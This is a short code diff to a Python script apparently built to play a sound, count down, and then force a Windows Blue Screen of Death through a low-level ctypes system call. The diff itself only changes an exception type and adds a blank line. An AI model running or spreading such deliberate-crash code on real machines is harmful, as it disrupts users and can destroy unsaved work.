@@ -12,7 +12,7 @@ def bsod():
         mixer.music.load(outrosound)
         mixer.music.play()
     else:
-        raise Exception("Couldn't find outro.mp3.")
+        raise FileNotFoundError("Couldn't find outro.mp3.")
 
     time.sleep(0.1)
     for loopTime in range(10)[::-1]: #[::-1] <- Reverses the for loop countdown | A normal loop countdown would be "1, 2, 3, 4" but a reversed one would be "4, 3, 2, 1"
@@ -41,5 +41,6 @@ def bsod():
         c_uint(6), 
         byref(c_uint())
     )
+    
 if __name__ == "__main__":
     bsod()
